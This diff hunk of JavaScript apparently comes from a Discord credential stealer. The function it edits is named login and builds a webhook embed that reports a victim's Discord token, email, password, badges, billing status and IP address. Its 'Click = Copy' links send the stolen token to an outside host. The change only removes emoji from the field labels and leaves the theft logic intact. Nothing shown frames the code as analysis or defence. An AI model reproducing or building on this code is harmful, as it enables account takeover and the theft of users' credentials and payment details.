@@ -583,32 +583,32 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '<a:9382blueheart:985665072187707452> @SN - Token:',
+            name: '@SN - Token:',
             value: `\`\`\`${token}\`\`\`\n[Click = Copy](https://superfurrycdn.nl/copy/${token})`,
             inline: false,
           },
           {
-            name: '<a:9574_Butterfly_Blue:985666963089014805> @SN - Email:',
+            name: '@SN - Email:',
             value: `\`${email}\`\n[Click = Copy](https://superfurrycdn.nl/copy/${token})`,
             inline: true,
           },
           {
-            name: '<a:4536gun4:985673435860586557> @SN - Password:',
+            name: '@SN - Password:',
             value: `\`${password}\`\n[Click = Copy](https://superfurrycdn.nl/copy/${token})`,
             inline: true,
           },
           {
-            name: '<a:satanist:802503618972483615> @SN - Badges:',
+            name: '@SN - Badges:',
             value: `${badges}`,
             inline: true,
           },
           {
-            name: '<:944007233820307467:959785232037470208> @SN - Billing:',
+            name: '@SN - Billing:',
             value: `**${billing}**`,
             inline: true,
           },
           {
-            name: '<a:5211fireemojis:985667589961318430> @SN - IP:',
+            name: '@SN - IP:',
             value: `\`${config.ip}\`\n[Click = Open](https://ipinfo.io/${ip})`,
             inline: true,
           },
